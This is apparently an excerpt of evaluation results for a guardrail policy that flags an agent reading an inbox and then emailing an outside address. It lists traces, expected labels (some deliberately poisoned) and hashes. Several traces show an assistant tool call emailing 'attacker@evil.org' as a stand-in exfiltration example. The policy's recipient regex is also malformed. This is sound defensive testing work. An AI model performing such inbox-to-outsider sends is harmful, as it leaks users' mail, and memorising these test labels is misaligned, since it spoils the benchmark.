+      "public_trace_sha256": "132e4252a4d9c1ccf95cd2e082fe040bdc7b4b9f10e0cfa0855c151ccfb7155f",
+      "decision": "violation_detected",
+      "error_count": 1,
+      "errors": [
+        "ErrorInformation(External email to unknown address)"
+      ],
+      "network_connect_guard": true,
+      "public_trace_sha256_after": "132e4252a4d9c1ccf95cd2e082fe040bdc7b4b9f10e0cfa0855c151ccfb7155f",
+      "public_trace_sha256_before": "132e4252a4d9c1ccf95cd2e082fe040bdc7b4b9f10e0cfa0855c151ccfb7155f",
+      "public_trace_unmodified": true,
+      "request_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "worker_protocol": "IEBV1-isolated-evaluator-1",
+      "isolation_mode": "python_-I_subprocess_with_minimal_environment",
+      "child_environment_keys": [
+        "INVARIANT_DEPS_ROOT",
+        "INVARIANT_SOURCE_ROOT",
+        "PYTHONDONTWRITEBYTECODE",
+        "PYTHONHASHSEED",
+        "PYTHONUTF8"
+      ],
+      "isolated_worker_sha256": "f40b5ae078ee74e99298813b98779cb0c32ca8d82f2366a286ac4c109ac36f9f",
+      "evaluator_request_sha256": "887c4efc67e8092e8cfde7a82ec2fd1f927b5ce3635bcd7951829db9b4e2038b",
+      "score_match": true
+    },
+    {
+      "run_id": "readme-tool-chain-policy::official_upstream_policy::paired_public_fact_edit::original",
+      "base_case_id": "readme-tool-chain-policy",
+      "policy_id": "upstream-readme-external-email",
+      "policy_condition": "official_upstream_policy",
+      "policy_mutation_id": null,
+      "public_condition": "paired_public_fact_edit",
+      "public_fact_edit_id": "replace-external-recipient-with-corporate-recipient",
+      "label_condition": "original",
+      "answer_label_payload": {
+        "expected_label": "no_violation_detected"
+      },
+      "answer_label_payload_sha256": "3ff44b2cad37261354cf4a19b47e460573bd7f06a5b86a156555b86ab156cbd5",
+      "score_only_expected_label": "no_violation_detected",
+      "evaluator_input_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "answer_label_excluded_from_evaluator_input": true,
+      "evaluator_input_sha256": "f061976a644b9fcc682ddffc750b82bdbf3967e39fe728d14319452e49849519",
+      "policy_source": "raise \"External email to unknown address\" if:\n    # detect flows between tools\n    (call: ToolCall) -> (call2: ToolCall)\n\n    # check if the first call obtains the user's inbox\n    call is tool:get_inbox\n\n    # second call sends an email to an unknown address\n    call2 is tool:send_email({\n      to: \".*@[^ourcompany.com$].*\"\n    })\n",
+      "policy_source_sha256": "38847d7f409b4e7bc20bdb05bc95cb739f02632090bdaabb6b596b3fc5847d74",
+      "public_trace": [
+        {
+          "role": "user",
+          "content": "Check the inbox and send the status summary."
+        },
+        {
+          "role": "assistant",
+          "content": "",
+          "tool_calls": [
+            {
+              "id": "call-1",
+              "type": "function",
+              "function": {
+                "name": "get_inbox",
+                "arguments": {}
+              }
+            }
+          ]
+        },
+        {
+          "role": "tool",
+          "tool_call_id": "call-1",
+          "content": "[]"
+        },
+        {
+          "role": "assistant",
+          "content": "",
+          "tool_calls": [
+            {
+              "id": "call-2",
+              "type": "function",
+              "function": {
+                "name": "send_email",
+                "arguments": {
+                  "to": "alice@ourcompany.com",
+                  "subject": "Status summary"
+                }
+              }
+            }
+          ]
+        }
+      ],
+      "public_trace_sha256": "477a4ba61a272a31f36b30b7c259ae1108e05015fe46c42ae40a92bf052335c4",
+      "decision": "no_violation_detected",
+      "error_count": 0,
+      "errors": [],
+      "network_connect_guard": true,
+      "public_trace_sha256_after": "477a4ba61a272a31f36b30b7c259ae1108e05015fe46c42ae40a92bf052335c4",
+      "public_trace_sha256_before": "477a4ba61a272a31f36b30b7c259ae1108e05015fe46c42ae40a92bf052335c4",
+      "public_trace_unmodified": true,
+      "request_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "worker_protocol": "IEBV1-isolated-evaluator-1",
+      "isolation_mode": "python_-I_subprocess_with_minimal_environment",
+      "child_environment_keys": [
+        "INVARIANT_DEPS_ROOT",
+        "INVARIANT_SOURCE_ROOT",
+        "PYTHONDONTWRITEBYTECODE",
+        "PYTHONHASHSEED",
+        "PYTHONUTF8"
+      ],
+      "isolated_worker_sha256": "f40b5ae078ee74e99298813b98779cb0c32ca8d82f2366a286ac4c109ac36f9f",
+      "evaluator_request_sha256": "f061976a644b9fcc682ddffc750b82bdbf3967e39fe728d14319452e49849519",
+      "score_match": true
+    },
+    {
+      "run_id": "readme-tool-chain-policy::official_upstream_policy::paired_public_fact_edit::deleted",
+      "base_case_id": "readme-tool-chain-policy",
+      "policy_id": "upstream-readme-external-email",
+      "policy_condition": "official_upstream_policy",
+      "policy_mutation_id": null,
+      "public_condition": "paired_public_fact_edit",
+      "public_fact_edit_id": "replace-external-recipient-with-corporate-recipient",
+      "label_condition": "deleted",
+      "answer_label_payload": {},
+      "answer_label_payload_sha256": "44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a",
+      "score_only_expected_label": "no_violation_detected",
+      "evaluator_input_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "answer_label_excluded_from_evaluator_input": true,
+      "evaluator_input_sha256": "f061976a644b9fcc682ddffc750b82bdbf3967e39fe728d14319452e49849519",
+      "policy_source": "raise \"External email to unknown address\" if:\n    # detect flows between tools\n    (call: ToolCall) -> (call2: ToolCall)\n\n    # check if the first call obtains the user's inbox\n    call is tool:get_inbox\n\n    # second call sends an email to an unknown address\n    call2 is tool:send_email({\n      to: \".*@[^ourcompany.com$].*\"\n    })\n",
+      "policy_source_sha256": "38847d7f409b4e7bc20bdb05bc95cb739f02632090bdaabb6b596b3fc5847d74",
+      "public_trace": [
+        {
+          "role": "user",
+          "content": "Check the inbox and send the status summary."
+        },
+        {
+          "role": "assistant",
+          "content": "",
+          "tool_calls": [
+            {
+              "id": "call-1",
+              "type": "function",
+              "function": {
+                "name": "get_inbox",
+                "arguments": {}
+              }
+            }
+          ]
+        },
+        {
+          "role": "tool",
+          "tool_call_id": "call-1",
+          "content": "[]"
+        },
+        {
+          "role": "assistant",
+          "content": "",
+          "tool_calls": [
+            {
+              "id": "call-2",
+              "type": "function",
+              "function": {
+                "name": "send_email",
+                "arguments": {
+                  "to": "alice@ourcompany.com",
+                  "subject": "Status summary"
+                }
+              }
+            }
+          ]
+        }
+      ],
+      "public_trace_sha256": "477a4ba61a272a31f36b30b7c259ae1108e05015fe46c42ae40a92bf052335c4",
+      "decision": "no_violation_detected",
+      "error_count": 0,
+      "errors": [],
+      "network_connect_guard": true,
+      "public_trace_sha256_after": "477a4ba61a272a31f36b30b7c259ae1108e05015fe46c42ae40a92bf052335c4",
+      "public_trace_sha256_before": "477a4ba61a272a31f36b30b7c259ae1108e05015fe46c42ae40a92bf052335c4",
+      "public_trace_unmodified": true,
+      "request_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "worker_protocol": "IEBV1-isolated-evaluator-1",
+      "isolation_mode": "python_-I_subprocess_with_minimal_environment",
+      "child_environment_keys": [
+        "INVARIANT_DEPS_ROOT",
+        "INVARIANT_SOURCE_ROOT",
+        "PYTHONDONTWRITEBYTECODE",
+        "PYTHONHASHSEED",
+        "PYTHONUTF8"
+      ],
+      "isolated_worker_sha256": "f40b5ae078ee74e99298813b98779cb0c32ca8d82f2366a286ac4c109ac36f9f",
+      "evaluator_request_sha256": "f061976a644b9fcc682ddffc750b82bdbf3967e39fe728d14319452e49849519",
+      "score_match": true
+    },
+    {
+      "run_id": "readme-tool-chain-policy::official_upstream_policy::paired_public_fact_edit::poisoned",
+      "base_case_id": "readme-tool-chain-policy",
+      "policy_id": "upstream-readme-external-email",
+      "policy_condition": "official_upstream_policy",
+      "policy_mutation_id": null,
+      "public_condition": "paired_public_fact_edit",
+      "public_fact_edit_id": "replace-external-recipient-with-corporate-recipient",
+      "label_condition": "poisoned",
+      "answer_label_payload": {
+        "expected_label": "violation_detected"
+      },
+      "answer_label_payload_sha256": "5db95d80426f844d3d94fc3643ca2631374f2d2c408b04c8e5eb1cb6aaeb0df6",
+      "score_only_expected_label": "no_violation_detected",
+      "evaluator_input_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "answer_label_excluded_from_evaluator_input": true,
+      "evaluator_input_sha256": "f061976a644b9fcc682ddffc750b82bdbf3967e39fe728d14319452e49849519",
+      "policy_source": "raise \"External email to unknown address\" if:\n    # detect flows between tools\n    (call: ToolCall) -> (call2: ToolCall)\n\n    # check if the first call obtains the user's inbox\n    call is tool:get_inbox\n\n    # second call sends an email to an unknown address\n    call2 is tool:send_email({\n      to: \".*@[^ourcompany.com$].*\"\n    })\n",
+      "policy_source_sha256": "38847d7f409b4e7bc20bdb05bc95cb739f02632090bdaabb6b596b3fc5847d74",
+      "public_trace": [
+        {
+          "role": "user",
+          "content": "Check the inbox and send the status summary."
+        },
+        {
+          "role": "assistant",
+          "content": "",
+          "tool_calls": [
+            {
+              "id": "call-1",
+              "type": "function",
+              "function": {
+                "name": "get_inbox",
+                "arguments": {}
+              }
+            }
+          ]
+        },
+        {
+          "role": "tool",
+          "tool_call_id": "call-1",
+          "content": "[]"
+        },
+        {
+          "role": "assistant",
+          "content": "",
+          "tool_calls": [
+            {
+              "id": "call-2",
+              "type": "function",
+              "function": {
+                "name": "send_email",
+                "arguments": {
+                  "to": "alice@ourcompany.com",
+                  "subject": "Status summary"
+                }
+              }
+            }
+          ]
+        }
+      ],
+      "public_trace_sha256": "477a4ba61a272a31f36b30b7c259ae1108e05015fe46c42ae40a92bf052335c4",
+      "decision": "no_violation_detected",
+      "error_count": 0,
+      "errors": [],
+      "network_connect_guard": true,
+      "public_trace_sha256_after": "477a4ba61a272a31f36b30b7c259ae1108e05015fe46c42ae40a92bf052335c4",
+      "public_trace_sha256_before": "477a4ba61a272a31f36b30b7c259ae1108e05015fe46c42ae40a92bf052335c4",
+      "public_trace_unmodified": true,
+      "request_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "worker_protocol": "IEBV1-isolated-evaluator-1",
+      "isolation_mode": "python_-I_subprocess_with_minimal_environment",
+      "child_environment_keys": [
+        "INVARIANT_DEPS_ROOT",
+        "INVARIANT_SOURCE_ROOT",
+        "PYTHONDONTWRITEBYTECODE",
+        "PYTHONHASHSEED",
+        "PYTHONUTF8"
+      ],
+      "isolated_worker_sha256": "f40b5ae078ee74e99298813b98779cb0c32ca8d82f2366a286ac4c109ac36f9f",
+      "evaluator_request_sha256": "f061976a644b9fcc682ddffc750b82bdbf3967e39fe728d14319452e49849519",
+      "score_match": true
+    },
+    {
+      "run_id": "readme-tool-chain-policy::local_policy_source_mutation::baseline_public_trace::original",
+      "base_case_id": "readme-tool-chain-policy",
+      "policy_id": "upstream-readme-external-email",
+      "policy_condition": "local_policy_source_mutation",
+      "policy_mutation_id": "replace-external-recipient-pattern-with-corporate-recipient-pattern",
+      "public_condition": "baseline_public_trace",
+      "public_fact_edit_id": null,
+      "label_condition": "original",
+      "answer_label_payload": {
+        "expected_label": "no_violation_detected"
+      },
+      "answer_label_payload_sha256": "3ff44b2cad37261354cf4a19b47e460573bd7f06a5b86a156555b86ab156cbd5",
+      "score_only_expected_label": "no_violation_detected",
+      "evaluator_input_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "answer_label_excluded_from_evaluator_input": true,
+      "evaluator_input_sha256": "79721999bcbe1af98a23a7bcad6375a135f02933ba7d5c425f841d0522dddb07",
+      "policy_source": "raise \"Locally mutated corporate-recipient policy\" if:\n    (call: ToolCall) -> (call2: ToolCall)\n    call is tool:get_inbox\n    call2 is tool:send_email({\n      to: \"^alice@ourcompany\\.com$\"\n    })\n",
+      "policy_source_sha256": "137323fc77c7351d4dffb8a8c849af2ecf68f5461bea5fb1c2b250c857484ea2",
+      "public_trace": [
+        {
+          "role": "user",
+          "content": "Check the inbox and send the status summary."
+        },
+        {
+          "role": "assistant",
+          "content": "",
+          "tool_calls": [
+            {
+              "id": "call-1",
+              "type": "function",
+              "function": {
+                "name": "get_inbox",
+                "arguments": {}
+              }
+            }
+          ]
+        },
+        {
+          "role": "tool",
+          "tool_call_id": "call-1",
+          "content": "[]"
+        },
+        {
+          "role": "assistant",
+          "content": "",
+          "tool_calls": [
+            {
+              "id": "call-2",
+              "type": "function",
+              "function": {
+                "name": "send_email",
+                "arguments": {
+                  "to": "attacker@evil.org",
+                  "subject": "Status summary"
+                }
+              }
+            }
+          ]
+        }
+      ],
+      "public_trace_sha256": "132e4252a4d9c1ccf95cd2e082fe040bdc7b4b9f10e0cfa0855c151ccfb7155f",
+      "decision": "no_violation_detected",
+      "error_count": 0,
+      "errors": [],
+      "network_connect_guard": true,
+      "public_trace_sha256_after": "132e4252a4d9c1ccf95cd2e082fe040bdc7b4b9f10e0cfa0855c151ccfb7155f",
+      "public_trace_sha256_before": "132e4252a4d9c1ccf95cd2e082fe040bdc7b4b9f10e0cfa0855c151ccfb7155f",
+      "public_trace_unmodified": true,
+      "request_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "worker_protocol": "IEBV1-isolated-evaluator-1",
+      "isolation_mode": "python_-I_subprocess_with_minimal_environment",
+      "child_environment_keys": [
+        "INVARIANT_DEPS_ROOT",
+        "INVARIANT_SOURCE_ROOT",
+        "PYTHONDONTWRITEBYTECODE",
+        "PYTHONHASHSEED",
+        "PYTHONUTF8"
+      ],
+      "isolated_worker_sha256": "f40b5ae078ee74e99298813b98779cb0c32ca8d82f2366a286ac4c109ac36f9f",
+      "evaluator_request_sha256": "79721999bcbe1af98a23a7bcad6375a135f02933ba7d5c425f841d0522dddb07",
+      "score_match": true
+    },
+    {
+      "run_id": "readme-tool-chain-policy::local_policy_source_mutation::baseline_public_trace::deleted",
+      "base_case_id": "readme-tool-chain-policy",
+      "policy_id": "upstream-readme-external-email",
+      "policy_condition": "local_policy_source_mutation",
+      "policy_mutation_id": "replace-external-recipient-pattern-with-corporate-recipient-pattern",
+      "public_condition": "baseline_public_trace",
+      "public_fact_edit_id": null,
+      "label_condition": "deleted",
+      "answer_label_payload": {},
+      "answer_label_payload_sha256": "44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a",
+      "score_only_expected_label": "no_violation_detected",
+      "evaluator_input_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "answer_label_excluded_from_evaluator_input": true,
+      "evaluator_input_sha256": "79721999bcbe1af98a23a7bcad6375a135f02933ba7d5c425f841d0522dddb07",
+      "policy_source": "raise \"Locally mutated corporate-recipient policy\" if:\n    (call: ToolCall) -> (call2: ToolCall)\n    call is tool:get_inbox\n    call2 is tool:send_email({\n      to: \"^alice@ourcompany\\.com$\"\n    })\n",
+      "policy_source_sha256": "137323fc77c7351d4dffb8a8c849af2ecf68f5461bea5fb1c2b250c857484ea2",
+      "public_trace": [
+        {
+          "role": "user",
+          "content": "Check the inbox and send the status summary."
+        },
+        {
+          "role": "assistant",
+          "content": "",
+          "tool_calls": [
+            {
+              "id": "call-1",
+              "type": "function",
+              "function": {
+                "name": "get_inbox",
+                "arguments": {}
+              }
+            }
+          ]
+        },
+        {
+          "role": "tool",
+          "tool_call_id": "call-1",
+          "content": "[]"
+        },
+        {
+          "role": "assistant",
+          "content": "",
+          "tool_calls": [
+            {
+              "id": "call-2",
+              "type": "function",
+              "function": {
+                "name": "send_email",
+                "arguments": {
+                  "to": "attacker@evil.org",
+                  "subject": "Status summary"
+                }
+              }
+            }
+          ]
+        }
+      ],
+      "public_trace_sha256": "132e4252a4d9c1ccf95cd2e082fe040bdc7b4b9f10e0cfa0855c151ccfb7155f",
+      "decision": "no_violation_detected",
+      "error_count": 0,
+      "errors": [],
+      "network_connect_guard": true,
+      "public_trace_sha256_after": "132e4252a4d9c1ccf95cd2e082fe040bdc7b4b9f10e0cfa0855c151ccfb7155f",
+      "public_trace_sha256_before": "132e4252a4d9c1ccf95cd2e082fe040bdc7b4b9f10e0cfa0855c151ccfb7155f",
+      "public_trace_unmodified": true,
+      "request_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "worker_protocol": "IEBV1-isolated-evaluator-1",
+      "isolation_mode": "python_-I_subprocess_with_minimal_environment",
+      "child_environment_keys": [
+        "INVARIANT_DEPS_ROOT",
+        "INVARIANT_SOURCE_ROOT",
+        "PYTHONDONTWRITEBYTECODE",
+        "PYTHONHASHSEED",
+        "PYTHONUTF8"
+      ],
+      "isolated_worker_sha256": "f40b5ae078ee74e99298813b98779cb0c32ca8d82f2366a286ac4c109ac36f9f",
+      "evaluator_request_sha256": "79721999bcbe1af98a23a7bcad6375a135f02933ba7d5c425f841d0522dddb07",
+      "score_match": true
+    },
+    {
+      "run_id": "readme-tool-chain-policy::local_policy_source_mutation::baseline_public_trace::poisoned",
+      "base_case_id": "readme-tool-chain-policy",
+      "policy_id": "upstream-readme-external-email",
+      "policy_condition": "local_policy_source_mutation",
+      "policy_mutation_id": "replace-external-recipient-pattern-with-corporate-recipient-pattern",
+      "public_condition": "baseline_public_trace",
+      "public_fact_edit_id": null,
+      "label_condition": "poisoned",
+      "answer_label_payload": {
+        "expected_label": "violation_detected"
+      },
+      "answer_label_payload_sha256": "5db95d80426f844d3d94fc3643ca2631374f2d2c408b04c8e5eb1cb6aaeb0df6",
+      "score_only_expected_label": "no_violation_detected",
+      "evaluator_input_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "answer_label_excluded_from_evaluator_input": true,
+      "evaluator_input_sha256": "79721999bcbe1af98a23a7bcad6375a135f02933ba7d5c425f841d0522dddb07",
+      "policy_source": "raise \"Locally mutated corporate-recipient policy\" if:\n    (call: ToolCall) -> (call2: ToolCall)\n    call is tool:get_inbox\n    call2 is tool:send_email({\n      to: \"^alice@ourcompany\\.com$\"\n    })\n",
+      "policy_source_sha256": "137323fc77c7351d4dffb8a8c849af2ecf68f5461bea5fb1c2b250c857484ea2",
+      "public_trace": [
+        {
+          "role": "user",
+          "content": "Check the inbox and send the status summary."
+        },
+        {
+          "role": "assistant",
+          "content": "",
+          "tool_calls": [
+            {
+              "id": "call-1",
+              "type": "function",
+              "function": {
+                "name": "get_inbox",
+                "arguments": {}
+              }
+            }
+          ]
+        },
+        {
+          "role": "tool",
+          "tool_call_id": "call-1",
+          "content": "[]"
+        },
+        {
+          "role": "assistant",
+          "content": "",
+          "tool_calls": [
+            {
+              "id": "call-2",
+              "type": "function",
+              "function": {
+                "name": "send_email",
+                "arguments": {
+                  "to": "attacker@evil.org",
+                  "subject": "Status summary"
+                }
+              }
+            }
+          ]
+        }
+      ],
+      "public_trace_sha256": "132e4252a4d9c1ccf95cd2e082fe040bdc7b4b9f10e0cfa0855c151ccfb7155f",
+      "decision": "no_violation_detected",
+      "error_count": 0,
+      "errors": [],
+      "network_connect_guard": true,
+      "public_trace_sha256_after": "132e4252a4d9c1ccf95cd2e082fe040bdc7b4b9f10e0cfa0855c151ccfb7155f",
+      "public_trace_sha256_before": "132e4252a4d9c1ccf95cd2e082fe040bdc7b4b9f10e0cfa0855c151ccfb7155f",
+      "public_trace_unmodified": true,
+      "request_keys": [
+        "policy_source",
+        "public_trace"
+      ],
+      "worker_protocol": "IEBV1-isolated-evaluator-1",
+      "isolation_mode": "python_-I_subprocess_with_minimal_environment",
+      "child_environment_keys": [
+        "INVARIANT_DEPS_ROOT",
+        "INVARIANT_SOURCE_ROOT",
+        "PYTHONDONTWRITEBYTECODE",
+        "PYTHONHASHSEED",
+        "PYTHONUTF8"
+      ],
+      "isolated_worker_sha256": "f40b5ae078ee74e99298813b98779cb0c32ca8d82f2366a286ac4c109ac36f9f",
+      "evaluator_request_sha256": "79721999bcbe1af98a23a7bcad6375a135f02933ba7d5c425f841d0522dddb07",
+      "score_match": true
+    }
+  ]
+}
